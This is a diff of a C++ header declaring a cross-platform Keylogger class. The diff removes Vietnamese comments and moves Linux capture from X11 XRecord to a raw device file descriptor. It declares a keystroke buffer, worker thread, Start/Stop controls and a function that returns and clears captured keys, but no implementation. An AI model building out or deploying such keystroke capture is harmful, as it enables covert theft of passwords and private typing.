@@ -5,19 +5,13 @@
 #endif
 
 class Keylogger {
-private:
-    // --- Các biến tĩnh (Static) ---
-    // Phải là static vì hàm Hook của Windows là hàm C thuần, 
-    // không thể gọi biến thành viên của Class C++ bình thường được.
+private:         
+    static std::vector<std::string> _buffer;     
+    static std::mutex _mtx;        
     
-    //static HHOOK _hook;             // "Cái móc" để câu sự kiện bàn phím
-    static std::vector<std::string> _buffer;     // Bộ nhớ đệm lưu tạm các phím vừa gõ
-    static std::mutex _mtx;         // Cái khóa bảo vệ bộ nhớ đệm
-    
-    std::thread _workerThread;      // Luồng chạy ngầm của Keylogger
-    std::atomic<bool> _isRunning;   // Cờ đánh dấu trạng thái đang chạy hay tắt
+    std::thread _workerThread;      
+    std::atomic<bool> _isRunning;   
 
-    // Hàm phụ để thêm chữ vào bộ đệm an toàn
     static void append(const std::string& str);
 
     #ifdef _WIN32
@@ -35,20 +29,15 @@ private:
     #endif
 
     #ifdef __linux__
-        Display* ctrlDisplay = nullptr;
-        XRecordContext recordContext = 0;
+        int _fd = -1;
         void LinuxLoop();
     #endif
 public:
     Keylogger();
     ~Keylogger();
 
-    // Hàm Callback (Hàm được Windows gọi mỗi khi có phím nhấn)
-    //static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+    void Start();
+    void Stop();  
 
-    void Start(); // Bắt đầu theo dõi
-    void Stop();  // Dừng theo dõi
-
-    // Hàm quan trọng: Lấy dữ liệu ra và xóa sạch bộ đệm cũ
     static std::vector<std::string> getDataAndClear();
 };
